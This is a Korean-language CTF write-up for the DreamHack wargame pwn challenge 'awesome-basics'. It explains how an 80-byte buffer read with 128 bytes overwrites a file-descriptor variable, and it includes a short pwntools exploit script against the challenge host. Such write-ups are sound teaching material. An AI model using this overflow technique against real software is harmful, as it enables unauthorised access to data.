---
ctf_name: "DreamHack Wargame"
challenge_name: "awesome-basics"
category: "pwn"           # web / pwn / rev / crypto / misc
difficulty: "easy"      # easy / medium / hard / insane
author: "laneeeey"
date: "2026-05-12"
points: 14
tags: [bof, stack-overflow]
---

# 문제명
awesome-basics

## 문제 설명

> Stack Buffer Overflow 취약점이 존재하는 프로그램입니다. 주어진 바이너리와 소스 코드를 분석하여 익스플로잇하고 플래그를 획득하세요! 플래그는 flag 파일에 있습니다.

- nc [Host] [Port]

## 풀이

### 분석

프로그램은 먼저 flag 파일을 읽어 heap 영역에 저장한다.
./tmp/flag 파일을 열고 입력을 buf에 받는다.
tmp_fd에 flag와 buf 내용을 쓴다.

tmp_fd는 파일 디스크립터이다. 파일 디스크립터에서 1은 stdout을 의미하기 때문에 tmp_fd 값을 1로 바꾸면 write(tmp_fd, flag, FLAG_SIZE)가 write(1, flag, FLAG_SIZE)처럼 동작한다.

### 취약점

buf의 사이즈는 80바이트인데 read()는 0x80, 128바이트까지 입력을 받는다. 80바이트를 초과하는 입력을 넣으면 buf 뒤에 위치한 지역 변수를 덮을 수 있다.

### 익스플로잇

buf 사이즈만큼 더미 값으로 채웠다.
80바이트 이후에 1을 4바이트 리틀엔디안으로 넣는다.
tmp_fd이 1로 바뀌었다.
write(1, flag, FLAG_SIZE)가 실행되어 flag가 출력된다.

```python
from pwn import *

p = remote("host3.dreamhack.games", 8358)

payload = b"A" * 80
payload += p32(1)

p.sendafter(b"Your Input: ", payload)

print(p.recvall().decode(errors="ignore"))
```

## 플래그

```
flag{REDACTED}
```

## 배운 점

stack overflow로 지역 변수를 조작하는 방식으로도 exploit이 가능하다는 것을 알게 됐다.

특히 파일 디스크립터 값을 바꾸면 프로그램의 출력 흐름도 바꿀 수 있었다.